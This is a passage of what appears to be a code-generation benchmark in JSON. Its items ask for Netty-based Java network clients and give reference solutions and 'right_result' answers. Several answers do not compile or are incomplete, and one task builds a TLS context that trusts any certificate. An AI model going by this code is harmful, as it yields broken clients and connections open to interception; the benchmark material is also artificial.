registry.counter(\"http.eventchannel.failure\");\n        this.liveConnections = Gauge.builder(\"http.eventchannel.connections\", () -> liveConnections.get()).register(registry);\n        this.nettyChannelBufferSize = Gauge.builder(\"http.eventchannel.buffer.size\", () -> nettyChannelBufferSize.get()).register(registry);\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n        this.eventLoopGroup = new NioEventLoopGroup(config.getClientThreads());\n        if (config.isEnableCompression()) {\n            this.encoderEventLoopGroup = new NioEventLoopGroup(config.getEncoderThreads());\n        }\n        this.bootstrap = new Bootstrap()\n                .group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new HttpClientCodec());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        if (encoderEventLoopGroup != null) {\n                            ch.pipeline().addLast(encoderEventLoopGroup.next(), new HttpContentCompressor());\n                        }\n                    }\n                });\n    }\n\n    public Channel findOrCreate(InetSocketAddress address) {\n        String key = getHostPortString(address);\n        return channels.computeIfAbsent(key, k -> {\n            try {\n                ChannelFuture future = bootstrap.connect(address).sync();\n                Channel channel = future.channel();\n                channel.closeFuture().addListener(f -> {\n                    channels.remove(k);\n                    liveConnections.decrementAndGet();\n                });\n                liveConnections.incrementAndGet();\n                nettyChannelBufferSize.set(channel.config().getSendBufferSize());\n                return channel;\n            } catch (Exception e) {\n                LOG.error(\"Failed to connect to \" + address, e);\n                connectionFailure.increment();\n                return null;\n            }\n        });\n    }\n\n    public Channel find(InetSocketAddress address) {\n        return channels.get(getHostPortString(address));\n    }\n\n    public void close(InetSocketAddress address) {\n        Channel channel = channels.remove(getHostPortString(address));\n        if (channel != null) {\n            channel.closeNow();\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + \":\" + address.getPort();\n    }\n}\n```"
  },
  {
    "Task_id": 142,
    "Instruction": "Task Description: Implement a Netty-based TCP client for tracking device communication that supports secure connections and periodic reconnection.\n\nClass Description: The TrackerClient class is an abstract implementation of a TCP client using Netty framework for communicating with tracking devices. It handles secure connections (SSL/TLS), manages connection lifecycle, and supports periodic reconnection. The class serves as a base for specific protocol implementations.\n\nAttributes:\n- secure: [boolean] - Indicates whether SSL/TLS encryption should be used\n- interval: [long] - Reconnection interval in seconds (0 means no reconnection)\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- port: [int] - Target server port number\n- address: [String] - Target server address\n- devices: [String[]] - Array of device identifiers to track\n- channelGroup: [ChannelGroup] - Manages all active channels\n\nMethods:\n- TrackerClient([Config] config, [String] protocol) -> [void] - Constructor that initializes the client with configuration and protocol settings\n- addProtocolHandlers([PipelineBuilder] pipeline, [Config] config) -> [void] - Abstract method to be implemented by subclasses for protocol-specific handlers\n- start() -> [void] - Starts the client and establishes connection to server\n- stop() -> [void] - Stops the client and closes all connections\n- isDatagram() -> [boolean] - Returns false indicating this is a TCP client\n- isSecure() -> [boolean] - Returns whether SSL/TLS is enabled\n- getDevices() -> [String[]] - Returns array of device identifiers\n- getChannelGroup() -> [ChannelGroup] - Returns the channel group managing all connections",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport io.netty.util.concurrent.GlobalEventExecutor;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.util.concurrent.TimeUnit;\n\npublic abstract class TrackerClient implements TrackerConnector {\n\n    private final boolean secure;\n    private final long interval;\n    private final Bootstrap bootstrap;\n    private final int port;\n    private final String address;\n    private final String[] devices;\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n\n    public TrackerClient(Config config, String protocol) {\n        secure = config.getBoolean(Keys.PROTOCOL_SSL.withPrefix(protocol));\n        interval = config.getLong(Keys.PROTOCOL_INTERVAL.withPrefix(protocol));\n        address = config.getString(Keys.PROTOCOL_ADDRESS.withPrefix(protocol));\n        port = config.getInteger(Keys.PROTOCOL_PORT.withPrefix(protocol), secure ? 443 : 80);\n        devices = config.getString(Keys.PROTOCOL_DEVICES.withPrefix(protocol)).split(\"[, ]\");\n\n        BasePipelineFactory pipelineFactory = new BasePipelineFactory(this, config, protocol) {\n            @Override\n            protected void addTransportHandlers(PipelineBuilder pipeline) {\n                try {\n                    if (isSecure()) {\n                        SSLEngine engine = SSLContext.getDefault().createSSLEngine();\n                        engine.setUseClientMode(true);\n                        pipeline.addLast(new SslHandler(engine));\n                    }\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n\n            @Override\n            protected void addProtocolHandlers(PipelineBuilder pipeline) {\n                try {\n                    TrackerClient.this.addProtocolHandlers(pipeline, config);\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        };\n\n        bootstrap = new Bootstrap()\n                .group(EventLoopGroupFactory.getWorkerGroup())\n                .channel(NioSocketChannel.class)\n                .handler(pipelineFactory);\n    }\n\n    protected abstract void addProtocolHandlers(PipelineBuilder pipeline, Config config) throws Exception;\n\n    @Override\n    public void start() throws Exception {\n        bootstrap.connect(address, port)\n                .syncUninterruptibly().channel().closeFuture().addListener(new GenericFutureListener<>() {\n                    @Override\n                    public void operationComplete(Future<? super Void> future) {\n                        if (interval > 0) {\n                            GlobalEventExecutor.INSTANCE.schedule(() -> {\n                                bootstrap.connect(address, port)\n                                        .syncUninterruptibly().channel().closeFuture().addListener(this);\n                            }, interval, TimeUnit.SECONDS);\n                        }\n                    }\n                });\n    }\n\n    @Override\n    public void stop() {\n        channelGroup.close().awaitUninterruptibly();\n    }\n\n    @Override\n    public boolean isDatagram() {\n        return false;\n    }\n\n    @Override\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    @Override\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\n\npublic abstract class TrackerClient {\n    private boolean secure;\n    private long interval;\n    private Bootstrap bootstrap;\n    private int port;\n    private String address;\n    private String[] devices;\n    private ChannelGroup channelGroup;\n\n    public TrackerClient(Config config, String protocol) {\n        // Initialize client with configuration and protocol settings\n        this.secure = config.isSecure();\n        this.interval = config.getReconnectInterval();\n        this.port = config.getPort();\n        this.address = config.getAddress();\n        this.devices = config.getDevices();\n\n        this.bootstrap = new Bootstrap()\n                .group(new NioEventLoopGroup())\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true);\n\n        if (secure) {\n            try {\n                SslContext sslCtx = SslContextBuilder.forClient().build();\n                bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline p = ch.pipeline();\n                        p.addLast(sslCtx.newHandler(ch.alloc()));\n                        addProtocolHandlers(p, config);\n                    }\n                });\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to create SSL context\", e);\n            }\n        }\n\n        channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n    }\n\n    public abstract void addProtocolHandlers(PipelineBuilder pipeline, Config config);\n\n    public void start() {\n        try {\n            ChannelFuture future = bootstrap.connect(address, port).sync();\n            Channel channel = future.channel();\n            channelGroup.add(channel);\n            System.out.println(\"Connected to \" + address + \":\" + port);\n\n            if (interval > 0) {\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n                ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);\n                scheduler.scheduleAtFixedRate(() -> {\n                    if (!channel.isActive()) {\n                        try {\n                            channel.close().sync();\n                            channel = bootstrap.connect(address, port).sync().channel();\n                            channelGroup.add(channel);\n                            System.out.println(\"Reconnected to \" + address + \":\" + port);\n                        } catch (InterruptedException e) {\n                            Thread.currentThread().interrupt();\n                        }\n                    }\n                }, interval, interval, TimeUnit.SECONDS);\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void stop() {\n        channelGroup.close().awaitUninterruptibly();\n        bootstrap.config().group().shutdownGracefully();\n        if (interval > 0) {\n            ((ScheduledExecutorService) bootstrap.group()).shutdownNow();\n        }\n    }\n\n    public boolean isDatagram() {\n        return false;\n    }\n\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n\n    public static class Config {\n        private boolean secure;\n        private long reconnectInterval;\n        private int port;\n        private String address;\n        private String[] devices;\n\n        public Config(boolean secure, long reconnectInterval, int port, String address, String[] devices) {\n            this.secure = secure;\n            this.reconnectInterval = reconnectInterval;\n            this.port = port;\n            this.address = address;\n            this.devices = devices;\n        }\n\n        public boolean isSecure() {\n            return secure;\n        }\n\n        public long getReconnectInterval() {\n            return reconnectInterval;\n        }\n\n        public int getPort() {\n            return port;\n        }\n\n        public String getAddress() {\n            return address;\n        }\n\n        public String[] getDevices() {\n            return devices;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 144,
    "Instruction": "Task Description: Create a Java class that implements a HTTP client using Netty framework to send HTTP requests and receive responses.\n\nClass Description: The HttpSnoopClient class is a Netty-based HTTP client that establishes TCP connections, sends HTTP requests, and handles responses. It supports SSL/TLS connections and provides methods for connection management.\n\nAttributes:\n- group: [NioEventLoopGroup] - Manages event loops for client I/O operations\n- bootstrap: [Bootstrap] - Configures and initializes the Netty client\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- HttpSnoopClient(): [Constructor] -> [void] - Initializes the event loop group and bootstrap instance\n- connect(String host, int port, SslContext sslCtx): [void] -> [void] - Establishes a connection to the specified host and port with optional SSL context\n- sendRequest(URI uri, String host): [void] -> [void] - Sends an HTTP GET request to the specified URI with appropriate headers\n- waitForClose(): [void] -> [void] - Waits for the channel to close\n- shutdown(): [void] -> [void] - Shuts down the event loop group gracefully\n- createSslContext(): [static] -> [SslContext] - Creates and returns an SSL context with insecure trust manager for testing purposes",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.cookie.ClientCookieEncoder;\nimport io.netty.handler.codec.http.cookie.DefaultCookie;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\n\npublic final class HttpSnoopClient {\n\n    static final String URL = System.getProperty(\"url\", \"http://127.0.0.1:8080/\");\n\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) throws InterruptedException {\n        bootstrap.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new HttpSnoopClientInitializer(sslCtx));\n        channel = bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        HttpRequest request = new DefaultFullHttpRequest(\n                HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getRawPath());\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().set(\n                HttpHeaderNames.COOKIE,\n                ClientCookieEncoder.STRICT.encode(\n                        new DefaultCookie(\"my-cookie\", \"foo\"),\n                        new DefaultCookie(\"another-cookie\", \"bar\")));\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() throws InterruptedException {\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() throws Exception {\n        return SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class HttpSnoopClient {\n    private EventLoopGroup group = new NioEventLoopGroup();\n    private Bootstrap bootstrap = new Bootstrap();\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        bootstrap.group(group)\n                   .channel(NioSocketChannel.class)\n                   .handler(new ChannelInitializer<SocketChannel>() {\n                       @Override\n                       protected void initChannel(SocketChannel ch) throws Exception {\n                           ChannelPipeline pipeline = ch.pipeline();\n                           if (channel != null && channel.isActive()) {\n                               pipeline.addLast(new HttpClientCodec());\n                               pipeline.addLast(new HttpObjectAggregator(512 * 1024));\n                           }\n                       }\n                   });\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) throws InterruptedException {\n        if (sslCtx != null) {\n            bootstrap.option(ChannelOption.TCP_NODELAY, true);\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(sslCtx.newHandler(ch.alloc(), host, port));\n                    pipeline.addLast(new HttpClientCodec());\n                    pipeline.addLast(new HttpObjectAggregator(512 * 1024));\n                }\n            });\n        }\n        channel = bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        HttpRequest request = new DefaultHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri.toString());\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() throws InterruptedException {\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        channel.close();\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() {\n        try {\n            return SslContextBuilder.forClient()\n                                   .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                                   .build();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to create SSL context\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 145,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework to establish TCP connections, send HTTP/2 requests, and handle responses.\n\nClass Description: The Http2Client class provides functionality to connect to an HTTP/2 server, send requests, and disconnect gracefully. It uses Netty's non-blocking I/O capabilities for efficient network communication.\n\nAttributes:\n- HOST: [String] - The host address to connect to (default: \"127.0.0.1\")\n- PORT: [int] - The port number to connect to (default: 8080)\n- URL: [String] - The endpoint path for HTTP requests (default: \"/whatever\")\n- workerGroup: [EventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline\n- channel: [Channel] - Represents the network communication channel\n\nMethods:\n- connect(): [void] - Establishes a TCP connection to the specified host and port using Netty's Bootstrap\n- sendRequest(): [void] - Sends an HTTP/2 request to the connected server and waits for responses\n- disconnect(): [void] - Closes the connection and releases resources gracefully",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpScheme;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.util.AsciiString;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Http2Client {\n\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = 8080;\n    private static final String URL = System.getProperty(\"url\", \"/whatever\");\n\n    private EventLoopGroup workerGroup;\n    private Http2ClientInitializer initializer;\n    private Channel channel;\n\n    public void connect() throws Exception {\n        workerGroup = new NioEventLoopGroup();\n        initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n\n        Bootstrap b = new Bootstrap();\n        b.group(workerGroup);\n        b.channel(NioSocketChannel.class);\n        b.option(ChannelOption.SO_KEEPALIVE, true);\n        b.remoteAddress(HOST, PORT);\n        b.handler(initializer);\n\n        channel = b.connect().syncUninterruptibly().channel();\n        System.out.println(\"Connected to [\" + HOST + ':' + PORT + ']');\n    }\n\n    public void sendRequest() throws Exception {\n        Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        HttpScheme scheme = HttpScheme.HTTP;\n        AsciiString hostName = new AsciiString(HOST + ':' + PORT);\n        System.err.println(\"Sending request(s)...\");\n\n        if (URL != null) {\n            FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, URL, Unpooled.EMPTY_BUFFER);\n            request.headers().add(HttpHeaderNames.HOST, hostName);\n            request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n            responseHandler.put(streamId, channel.write(request), channel.newPromise());\n        }\n\n        channel.flush();\n        responseHandler.awaitResponses(5, TimeUnit.SECONDS);\n        System.out.println(\"Finished HTTP/2 request(s)\");\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http2.Http2ClientCodec;\nimport io.netty.handler.codec.http2.Http2ConnectionHandlerBuilder;\nimport io.netty.handler.codec.http2.Http2FrameCodecBuilder;\n\npublic class Http2Client {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8080;\n    private static final String URL = \"/whatever\";\n\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n\n    public void connect() throws Exception {\n        workerGroup = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n\n            Http2ClientInitializer initializer = new Http2ClientInitializer();\n\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(initializer);\n                }\n            });\n\n            // Start the connection attempt.\n            channel = b.connect(HOST, PORT).sync().channel();\n        } catch (Exception e) {\n            workerGroup.shutdownGracefully();\n            throw e;\n        }\n    }\n\n    public void sendRequest() throws Exception {\n        if (channel != null && channel.isActive()) {\n            // Send HTTP/2 request here\n            // Example: channel.writeAndFlush(new DefaultFullHttpRequest(HttpVersion.HTTP_2, HttpMethod.GET, URL));\n        } else {\n            System.out.println(\"Channel is not active\");\n        }\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n}\n\nclass Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n    private final Http2ConnectionHandler handler;\n\n    public Http2ClientInitializer() {\n        this.handler = new Http2ConnectionHandlerBuilder()\n                .frameDecoder(new Http2FrameCodecBuilder(false).build())\n                .frameEncoder(new Http2FrameCodecBuilder(true).build())\n                .connectionHandler(new Http2MultiplexHandler(new Http2ClientHandler()))\n                .build();\n    }\n\n    @Override\n    protected void initChannel(SocketChannel ch) throws Exception {\n        ch.pipeline().addLast(handler);\n    }\n}\n\nclass Http2ClientHandler extends SimpleChannelInboundHandler<Object> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n        // Handle response here\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 146,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to multiple hosts, send HTTP requests, and handle responses.\n\nClass Description: NettyTcpClient is a TCP client implementation using Netty framework that connects to multiple hosts, sends HTTP GET requests to a specified path, and handles responses. It manages connection lifecycle and includes automatic reconnection on failure.\n\nAttributes:\n- hosts: List<String> - List of host addresses to connect to\n- port: int - TCP port number for connections\n- path: String - HTTP path for GET requests\n- group: EventLoopGroup - Netty event loop group for managing I/O threads\n- bootstrap: Bootstrap - Netty bootstrap for client configuration\n- channelConnectListener: ChannelConnectListener - Listener for connection events\n\nMethods:\n- NettyTcpClient(List<String> hosts, int port, String path) -> None - Constructor that initializes the client with target hosts, port, and request path\n- connect() -> None - Initiates connections to all specified hosts\n- shutdown() -> None - Gracefully shuts down the client and releases resources\n- ResponseHandler(Bootstrap bootstrap) -> None - (Inner class constructor) Handles HTTP responses and manages request cycle\n- channelActive(ChannelHandlerContext ctx) -> None - (Inner class method) Called when channel becomes active, sends initial request\n- channelRead0(ChannelHandlerContext ctx, HttpObject msg) -> None - (Inner class method) Processes incoming HTTP messages\n- channelInactive(ChannelHandlerContext ctx) -> None - (Inner class method) Handles channel disconnection and triggers reconnection\n- sendRequest(ChannelHandlerContext ctx) -> None - (Inner class method) Sends HTTP GET request\n- operationComplete(ChannelFuture future) -> None - (Inner class method) Listener callback for connection completion events",
    "Canonical_solution": "import com.github.ambry.rest.RestUtils;\nimport com.github.ambry.utils.Pair;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.DefaultHttpRequest;\nimport io.netty.handler.codec.http.HttpChunkedInput;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyTcpClient {\n\n  private final List<String> hosts;\n  private final int port;\n  private final String path;\n  private final EventLoopGroup group;\n  private final Bootstrap bootstrap;\n  private final ChannelConnectListener channelConnectListener = new ChannelConnectListener();\n\n  public NettyTcpClient(List<String> hosts, int port, String path) {\n    this.hosts = hosts;\n    this.port = port;\n    this.path = path;\n    this.group = new NioEventLoopGroup();\n    this.bootstrap = new Bootstrap()\n        .group(group)\n        .channel(NioSocketChannel.class)\n        .handler(new ChannelInitializer<SocketChannel>() {\n          @Override\n          public void initChannel(SocketChannel ch) {\n            ch.pipeline()\n                .addLast(new HttpClientCodec())\n                .addLast(new ChunkedWriteHandler())\n                .addLast(new ResponseHandler(bootstrap));\n          }\n        });\n  }\n\n  public void connect() {\n    for (String host : hosts) {\n      ChannelFuture future = bootstrap.connect(host, port);\n      future.addListener(channelConnectListener);\n    }\n  }\n\n  public void shutdown() {\n    group.shutdownGracefully();\n  }\n\n  private class ResponseHandler extends SimpleChannelInboundHandler<HttpObject> {\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private final Bootstrap bootstrap;\n    private HttpRequest request;\n\n    ResponseHandler(Bootstrap bootstrap) {\n      this.bootstrap = bootstrap;\n    }\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) {\n      sendRequest(ctx);\n    }\n\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n      if (msg instanceof HttpResponse) {\n        HttpResponse response = (HttpResponse) msg;\n        if (!HttpUtil.isKeepAlive(response)) {\n          ctx.close();\n        }\n      }\n      if (msg instanceof LastHttpContent) {\n        if (ctx.channel().isActive()) {\n          sendRequest(ctx);\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n      bootstrap.connect().addListener(channelConnectListener);\n    }\n\n    private void sendRequest(ChannelHandlerContext ctx) {\n      request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path);\n      ctx.writeAndFlush(request);\n    }\n  }\n\n  private class ChannelConnectListener implements GenericFutureListener<ChannelFuture> {\n    @Override\n    public void operationComplete(ChannelFuture future) {\n      if (!future.isSuccess()) {\n        logger.error(\"Channel connection failed\", future.cause());\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\n\nimport java.util.List;\n\npublic class NettyTcpClient {\n    private final List<String> hosts;\n    private final int port;\n    private final String path;\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n    private ChannelConnectListener channelConnectListener;\n\n    public NettyTcpClient(List<String> hosts, int port, String path) {\n        this.hosts = hosts;\n        this.port = port;\n        this.path = path;\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap()\n                .group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpObjectAggregator(1024 * 1024));\n                        pipeline.addLast(new ResponseHandler(bootstrap));\n                    }\n                });\n        this.channelConnectListener = new ChannelConnectListener(this);\n    }\n\n    public void connect() {\n        for (String host : hosts) {\n            bootstrap.connect(host, port).addListener(channelConnectListener);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class ResponseHandler extends SimpleChannelInboundHandler<HttpObject> {\n        private final Bootstrap bootstrap;\n\n        public ResponseHandler(Bootstrap bootstrap) {\n            this.bootstrap = bootstrap;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) throws Exception {\n            if (msg instanceof HttpResponse response) {\n                System.out.println(\"Response status: \" + response.status());\n            } else if (msg instanceof HttpContent content) {\n                ByteBuf buf = content.content();\n                while (buf.isReadable()) {\n                    System.out.print((char) buf.readByte());\n                }\n                if (content instanceof LastHttpContent) {\n                    ctx.close();\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            sendRequest(ctx);\n        }\n\n        private void sendRequest(ChannelHandlerContext ctx) {\n            FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path);\n            request.headers().set(HttpHeaderNames.HOST, \"example.com\");\n            request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n            ctx.writeAndFlush(request);\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext 